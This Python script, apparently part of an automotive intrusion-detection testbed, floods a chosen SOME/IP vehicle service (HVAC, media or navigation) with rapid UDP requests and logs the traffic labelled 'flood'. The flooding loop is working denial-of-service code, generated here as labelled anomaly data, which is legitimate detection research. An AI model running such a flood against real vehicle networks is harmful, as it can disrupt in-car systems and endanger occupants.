"""
Flood attack — sends rapid-fire SOME/IP requests to overwhelm a target service.

This generates a sustained burst of 100+ messages/second to a single service,
creating a clear statistical anomaly in message rate and burst patterns.

Usage:
    python -m attacks.flood [--target-service HVAC] [--duration 10] [--rate 200]
"""

from __future__ import annotations

import argparse
import logging
import os
import random
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from proto.someip import SomeIpHeader, SomeIpMessage, pack_someip, MessageType
from proto.constants import SERVICES, HVAC_SERVICE_ID, MEDIA_SERVICE_ID, NAV_SERVICE_ID
from client.traffic_logger import get_logger

logging.basicConfig(level=logging.INFO, format="%(asctime)s [FLOOD] %(message)s")
log = logging.getLogger("Flood")

SERVICE_MAP = {
    "HVAC": HVAC_SERVICE_ID,
    "Media": MEDIA_SERVICE_ID,
    "Navigation": NAV_SERVICE_ID,
}


def main():
    parser = argparse.ArgumentParser(description="SOME/IP Flood Attack")
    parser.add_argument("--target-service", choices=["HVAC", "Media", "Navigation"], default="HVAC")
    parser.add_argument("--target-ip", default="172.20.0.10")
    parser.add_argument("--target-port", type=int, default=None)
    parser.add_argument("--duration", type=float, default=10, help="Attack duration in seconds")
    parser.add_argument("--rate", type=int, default=200, help="Messages per second")
    parser.add_argument("--log-path", default="/logs/traffic.jsonl")
    args = parser.parse_args()

    service_id = SERVICE_MAP[args.target_service]
    target_port = args.target_port or SERVICES[service_id]["port"]
    methods = SERVICES[service_id]["methods"]

    logger = get_logger(args.log_path)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)  # 1MB send buffer

    interval = 1.0 / args.rate
    method_ids = list(methods.values())

    log.info(
        "FLOOD starting: %s at %s:%d — %d msg/s for %.1fs",
        args.target_service, args.target_ip, target_port, args.rate, args.duration,
    )

    session_counter = 0
    msg_count = 0
    start_time = time.time()

    while time.time() - start_time < args.duration:
        session_counter = (session_counter % 0xFFFF) + 1
        method_id = random.choice(method_ids)

        header = SomeIpHeader(
            service_id=service_id,
            method_id=method_id,
            client_id=0x00FF,  # Attacker client ID
            session_id=session_counter,
            message_type=MessageType.REQUEST,
        )

        # Generate random but realistic-looking payload
        if args.target_service == "HVAC":
            payload = struct.pack("!Hf", random.randint(1, 4), random.uniform(10, 40))
        elif args.target_service == "Media":
            payload = b"\x01"
        else:
            dest = b"FloodDest"
            payload = struct.pack("!H", len(dest)) + dest

        msg_bytes = pack_someip(SomeIpMessage(header=header, payload=payload))

        try:
            sock.sendto(msg_bytes, (args.target_ip, target_port))
        except Exception as e:
            log.warning("Send failed: %s", e)

        # Log every 10th message to avoid I/O bottleneck dominating the attack
        if msg_count % 10 == 0:
            logger.log(
                header, payload, direction="sent",
                src_ip="attacker", dst_ip=args.target_ip,
                label="flood",
            )

        msg_count += 1

        # Throttle to target rate
        elapsed = time.time() - start_time
        expected = msg_count * interval
        if expected > elapsed:
            time.sleep(expected - elapsed)

    actual_duration = time.time() - start_time
    actual_rate = msg_count / actual_duration if actual_duration > 0 else 0

    log.info(
        "FLOOD complete: %d messages in %.1fs (%.0f msg/s actual)",
        msg_count, actual_duration, actual_rate,
    )
    sock.close()


if __name__ == "__main__":
    main()
